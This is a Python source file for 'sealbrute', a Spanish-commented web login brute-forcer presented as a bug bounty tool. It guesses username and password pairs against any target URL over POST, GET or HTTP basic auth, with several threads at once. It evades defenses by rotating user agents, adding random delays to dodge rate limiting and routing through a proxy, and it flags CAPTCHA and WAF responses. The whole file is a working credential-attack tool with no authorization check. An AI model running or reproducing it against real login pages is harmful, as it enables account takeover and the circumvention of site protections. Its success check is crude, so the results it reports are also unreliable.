#!/usr/bin/env python3
"""
sealbrute - Brute-forcer web sigiloso e inteligente
Integrado con sealctl para bug bounty
"""

import requests
import argparse
import json
import time
import random
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

class SealBrute:
    def __init__(self, target, wordlist, mode='post', 
                 delay_range=(1, 3), threads=5,
                 user_agent_rotate=True, proxy=None):
        self.target = target
        self.wordlist = wordlist
        self.mode = mode
        self.delay_range = delay_range
        self.max_threads = threads
        self.rotate_ua = user_agent_rotate
        self.proxy = proxy
        self.results = []
        self.lock = threading.Lock()
        self.session = requests.Session()
        
        # User agents para rotar
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
            'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0'
        ]
        
        # Detección de CAPTCHA/WAF
        self.captcha_keywords = ['captcha', 'recaptcha', 'verify', 'challenge']
        self.waf_keywords = ['blocked', 'forbidden', 'suspicious', 'rate limit']
        
    def get_random_user_agent(self):
        return random.choice(self.user_agents) if self.rotate_ua else self.user_agents[0]
    
    def intelligent_delay(self):
        """Delay aleatorio para evadir rate limiting"""
        delay = random.uniform(self.delay_range[0], self.delay_range[1])
        time.sleep(delay)
    
    def detect_captcha_or_waf(self, response):
        """Detecta si hay CAPTCHA o WAF"""
        content = response.text.lower()
        for keyword in self.captcha_keywords + self.waf_keywords:
            if keyword in content:
                return True
        return False
    
    def brute_force(self, credential):
        """Intenta un login con credenciales"""
        username, password = credential
        
        headers = {
            'User-Agent': self.get_random_user_agent(),
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        if self.proxy:
            proxies = {'http': self.proxy, 'https': self.proxy}
        else:
            proxies = {}
        
        try:
            if self.mode == 'post':
                data = {'username': username, 'password': password}
                response = self.session.post(self.target, headers=headers, 
                                           data=data, proxies=proxies, timeout=10)
            elif self.mode == 'get':
                url = f"{self.target}?username={username}&password={password}"
                response = self.session.get(url, headers=headers, proxies=proxies, timeout=10)
            elif self.mode == 'http-basic':
                from requests.auth import HTTPBasicAuth
                response = self.session.get(self.target, headers=headers, proxies=proxies, 
                                          timeout=10, auth=HTTPBasicAuth(username, password))
            else:
                raise ValueError(f"Mode {self.mode} not supported")
            
            # Detectar CAPTCHA/WAF
            if self.detect_captcha_or_waf(response):
                return {
                    'username': username,
                    'password': password,
                    'status': 'BLOCKED',
                    'status_code': response.status_code,
                    'reason': 'CAPTCHA/WAF detected',
                    'timestamp': datetime.now().isoformat()
                }
            
            # Verificar si es éxito (código 200-299 y redirección o contenido diferente)
            if response.status_code in [200, 302, 303]:
                return {
                    'username': username,
                    'password': password,
                    'status': 'SUCCESS',
                    'status_code': response.status_code,
                    'content_length': len(response.content),
                    'timestamp': datetime.now().isoformat()
                }
            
            return {
                'username': username,
                'password': password,
                'status': 'FAILED',
                'status_code': response.status_code,
                'timestamp': datetime.now().isoformat()
            }
            
        except requests.exceptions.RequestException as e:
            return {
                'username': username,
                'password': password,
                'status': 'ERROR',
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            }
        finally:
            self.intelligent_delay()
    
    def load_wordlist(self, filepath):
        """Carga wordlist desde archivo"""
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    
    def generate_combinations(self, usernames, passwords):
        """Genera combinaciones usuario:password"""
        for username in usernames:
            for password in passwords:
                yield (username, password)
    
    def run(self, usernames_file, passwords_file, output_file=None):
        """Ejecuta el brute force"""
        print(f"[*] Cargando wordlists...")
        usernames = self.load_wordlist(usernames_file)
        passwords = self.load_wordlist(passwords_file)
        
        print(f"[*] {len(usernames)} usuarios, {len(passwords)} passwords")
        print(f"[*] Target: {self.target}")
        print(f"[*] Threads: {self.max_threads}")
        print(f"[*] Delay: {self.delay_range[0]}-{self.delay_range[1]}s")
        print(f"[*] Iniciando ataque sigiloso...\n")
        
        combinations = list(self.generate_combinations(usernames, passwords))
        total = len(combinations)
        completed = 0
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {executor.submit(self.brute_force, cred): cred for cred in combinations}
            
            for future in as_completed(futures):
                result = future.result()
                completed += 1
                
                # Guardar resultado
                with self.lock:
                    self.results.append(result)
                
                # Mostrar progreso
                progress = (completed / total) * 100
                print(f"[{progress:.1f}%] {result['username']}:{result['password']} -> {result['status']}", end='\r')
                
                # Si encontró algo, imprimir completo
                if result['status'] == 'SUCCESS':
                    print(f"\n[+] ¡ÉXITO! {result['username']}:{result['password']}")
                    print(f"[+] Status: {result['status_code']}")
                    print(f"[+] Timestamp: {result['timestamp']}")
        
        # Guardar resultados
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(self.results, f, indent=2)
            print(f"\n[*] Resultados guardados en {output_file}")
        
        # Estadísticas
        success = sum(1 for r in self.results if r['status'] == 'SUCCESS')
        blocked = sum(1 for r in self.results if r['status'] == 'BLOCKED')
        
        print(f"\n=== ESTADÍSTICAS ===")
        print(f"Total intentos: {total}")
        print(f"Éxitos: {success}")
        print(f"Bloqueados (WAF/CAPTCHA): {blocked}")
        print(f"Fallidos: {total - success - blocked}")
        
        return self.results


def main():
    parser = argparse.ArgumentParser(description='sealbrute - Brute-forcer web sigiloso')
    parser.add_argument('-t', '--target', required=True, help='URL objetivo')
    parser.add_argument('-u', '--usernames', required=True, help='Wordlist de usuarios')
    parser.add_argument('-p', '--passwords', required=True, help='Wordlist de passwords')
    parser.add_argument('-m', '--mode', default='post', choices=['post', 'get', 'http-basic'])
    parser.add_argument('--delay', default='1-3', help='Delay range (ej: 1-3)')
    parser.add_argument('--threads', type=int, default=5, help='Número de threads')
    parser.add_argument('--proxy', help='Proxy (ej: http://localhost:8080)')
    parser.add_argument('-o', '--output', help='Archivo de salida JSON')
    
    args = parser.parse_args()
    
    delay_range = tuple(map(float, args.delay.split('-')))
    
    brute = SealBrute(
        target=args.target,
        wordlist=None,
        mode=args.mode,
        delay_range=delay_range,
        threads=args.threads,
        proxy=args.proxy
    )
    
    brute.run(args.usernames, args.passwords, args.output)


if __name__ == '__main__':
    main()